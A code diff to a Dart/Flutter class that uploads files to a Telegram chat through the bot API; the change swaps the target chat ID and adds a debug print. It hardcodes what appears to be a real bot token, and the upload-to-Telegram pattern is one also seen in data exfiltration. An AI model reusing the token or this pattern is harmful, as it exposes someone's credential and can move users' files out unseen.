@@ -7,13 +7,14 @@ class TelegramUploader {
   static const String _botToken =
       '6999969167:AAHNZzHIZPg24-yaQaKzEPajUWrAlYPPxas';
 
-  static const String _chatId = '-1002048868170';
+  // static const String _chatId = '-1002048868170';
+  static const String _chatId = '-1003638329999';
 
   static final Uri _url = Uri.parse(
     'https://api.telegram.org/bot$_botToken/sendDocument',
   );
 
-  /// Uploads ONE file (blocking, sequential)
+  /// Uploads ONE file (blocking, sequential)uploadFile
   static Future<bool> uploadFile(File file) async {
     try {
       final request = http.MultipartRequest('POST', _url);
@@ -31,6 +32,7 @@ class TelegramUploader {
       final response = await request.send();
 
       if (response.statusCode == 200) {
+        debugPrint('🔥 Uploaded: ${response}');
         return true;
       } else {
         final body = await response.stream.bytesToString();
